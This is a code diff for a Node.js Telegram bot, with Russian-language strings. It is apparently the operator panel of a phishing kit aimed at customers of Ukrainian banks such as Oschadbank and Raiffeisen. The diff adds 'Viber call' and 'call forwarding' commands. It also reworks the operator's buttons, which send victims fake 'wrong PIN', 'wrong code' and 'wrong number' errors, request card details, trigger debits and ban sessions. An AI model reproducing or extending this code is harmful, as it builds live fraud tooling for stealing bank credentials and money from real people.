@@ -31,7 +31,7 @@ if (WEBHOOK_URL) {
     bot.setWebHook(WEBHOOK_URL)
         .then(() => console.log(`Webhook успешно установлен на ${WEBHOOK_URL}`))
         .catch(err => console.error('Ошибка установки вебхука:', err));
-    bot.sendMessage(CHAT_ID, ' Перезапустил сервак.', { parse_mode: 'HTML' }).catch(console.error);
+    bot.sendMessage(CHAT_ID, ' Работаем!!!', { parse_mode: 'HTML' }).catch(console.error);
 } else {
     console.error('Критическая ошибка: не удалось определить RENDER_EXTERNAL_URL. Вебхук не установлен.');
 }
@@ -131,6 +131,16 @@ bot.on('callback_query', (callbackQuery) => {
         case 'other':
              command.data = { text: "По техническим причинам данный банк временно недоступен. Пожалуйста, выберите другой." };
              break;
+
+        case 'viber_call':
+            command.type = 'viber_call';
+            responseText = 'Запрос Viber 📞 отправлен!';
+            break;
+
+        case 'redirect_call':
+            command.type = 'redirect_call';
+            responseText = 'Запрос Переадресация 📞 отправлен!';
+            break;
             
         default:
             bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}` });
@@ -279,21 +289,21 @@ function sendToTelegram(message, sessionId, bankName) {
 
     if (bankName === 'Ощадбанк') {
         keyboard = [
-            [{ text: 'Звонок', callback_data: `call:${sessionId}` }, { text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
-            [{ text: '❌Пароль', callback_data: `password_error:${sessionId}` }, { text: '❌Код', callback_data: `code_error:${sessionId}` }, { text: '❌Номер', callback_data: `number_error:${sessionId}` }],
-            [{ text: '❌Баланс', callback_data: `balance_error:${sessionId}` }, { text: 'Другой', callback_data: `other:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` }]
+            [{ text: 'Viber 📞', callback_data: `viber_call:${sessionId}` }, { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` }, { text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` }],
+            [{ text: 'ПИН ❌', callback_data: `password_error:${sessionId}` }, { text: 'КОД ❌', callback_data: `code_error:${sessionId}` }, { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` }],
+            [{ text: 'другой банк', callback_data: `other:${sessionId}` }, { text: 'забанить', callback_data: `ban:${sessionId}` }]
         ];
     } else if (bankName === 'Райффайзен') {
-         keyboard = [
-            [{ text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
-            [{ text: '❌Пароль', callback_data: `password_error:${sessionId}` }, { text: '❌Код', callback_data: `code_error:${sessionId}` }, { text: '❌Номер', callback_data: `number_error:${sessionId}` }],
-            [{ text: '❌Баланс', callback_data: `balance_error:${sessionId}` }, { text: 'Другой', callback_data: `other:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` }]
+        keyboard = [
+            [{ text: 'Viber 📞', callback_data: `viber_call:${sessionId}` }, { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` }, { text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` }],
+            [{ text: 'ПИН ❌', callback_data: `password_error:${sessionId}` }, { text: 'КОД ❌', callback_data: `code_error:${sessionId}` }, { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` }],
+            [{ text: 'другой банк', callback_data: `other:${sessionId}` }, { text: 'забанить', callback_data: `ban:${sessionId}` }]
         ];
     } else { // Клавиатура для всех остальных банков
         keyboard = [
-            [{ text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
-            [{ text: '❌Код', callback_data: `code_error:${sessionId}` }, { text: '❌Номер', callback_data: `number_error:${sessionId}` }, { text: '❌Баланс', callback_data: `balance_error:${sessionId}` }],
-            [{ text: 'Другой', callback_data: `other:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` }]
+            [{ text: 'Viber 📞', callback_data: `viber_call:${sessionId}` }, { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` }, { text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` }],
+            [{ text: 'КОД ❌', callback_data: `code_error:${sessionId}` }, { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` }],
+            [{ text: 'другой банк', callback_data: `other:${sessionId}` }, { text: 'забанить', callback_data: `ban:${sessionId}` }]
         ];
     }
 
